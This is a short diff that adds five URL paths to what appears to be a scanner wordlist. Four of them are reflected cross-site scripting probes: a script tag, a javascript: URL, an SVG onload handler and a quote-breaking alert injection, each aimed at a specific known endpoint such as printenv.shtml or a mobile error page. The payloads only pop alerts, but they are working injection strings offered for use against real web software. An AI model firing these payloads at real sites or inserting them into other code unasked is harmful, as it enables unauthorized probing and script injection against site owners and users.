@@ -1,0 +1,5 @@
+/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E
+/share/page/dologin
+/mobile/error-not-supported-platform.html?desktop_url=javascript:alert(1337);//itms://
+/webapp/?fccc%27\%22%3E%3Csvg/onload=alert(xss)%3E
+/?mobile=1&mp_idx=%22;alert(%271%27);//
